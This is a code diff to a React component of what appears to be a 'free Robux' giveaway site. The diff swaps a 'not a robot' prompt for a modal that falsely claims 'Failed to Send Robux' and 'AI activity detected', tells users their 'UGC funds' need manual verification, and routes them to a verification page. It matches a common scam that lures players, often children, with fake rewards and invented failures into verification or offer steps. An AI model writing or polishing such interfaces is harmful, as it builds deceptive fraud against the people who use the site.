@@ -2,6 +2,7 @@
 
 import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
+import Image from "next/image";
 import Box3 from "./Box3";
 import robuxPackages from "../../robuxPackages.json";
 import additionalPackages from "../../additionalPackages.json";
@@ -125,33 +126,42 @@ const RobuxBox = () => {
         <Box3
           additionalPackages={additionalPackages}
           robuxPackages={robuxPackages}
-          bonusItem={{
-            name: "Platinum Domino Crown",
-            image: "/images/bonus-item.gif",
-            description:
-              "One bonus item per account. Refunds result in losing the item.",
-            limitedTime: true,
-          }}
           handleRobuxClick={handleRobuxClick}
         />
       )}
 
       {currentStep === "final" && (
-        <div className="box4">
-          <h3>Final Step!</h3>
-          <p>
-            Please verify that you are not a robot by answering a few questions
-            to receive your Robux! Please enter valid information for the Robux
-            to go through. Take your time, as completing it will grant you bonus
-            Robux as a reward!
-          </p>
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 px-4">
+          <div className="w-full max-w-md rounded-lg bg-white p-6 text-center shadow-2xl">
+            <div className="mx-auto mb-4 flex h-24 w-24 items-center justify-center rounded-full bg-red-50">
+              <Image
+                src="/images/norobots.png"
+                alt="No robots verification"
+                width={96}
+                height={96}
+                className="h-20 w-20 object-contain"
+                priority
+              />
+            </div>
+
+            <h3 className="text-2xl font-bold text-gray-900">
+              Failed to Send Robux
+            </h3>
+            <p className="mt-2 text-base font-semibold text-red-600">
+              AI activity detected.
+            </p>
+            <p className="mt-4 text-sm leading-6 text-gray-700 sm:text-base">
+              Manual verification is required before your UGC funds can be
+              released.
+            </p>
+
           <button
             onClick={() => router.push("/giveaway/verify")}
-            style={{ fontSize: "19px" }}
-            className="mt-3 w-1/3 hover:bg-green-700 bg-green-500"
+              className="mt-6 min-h-12 w-full rounded-md bg-green-500 px-5 py-3 text-base font-bold text-white shadow-md transition hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2"
           >
-            Verify
+              Proceed to Verification
           </button>
+          </div>
         </div>
       )}
     </div>
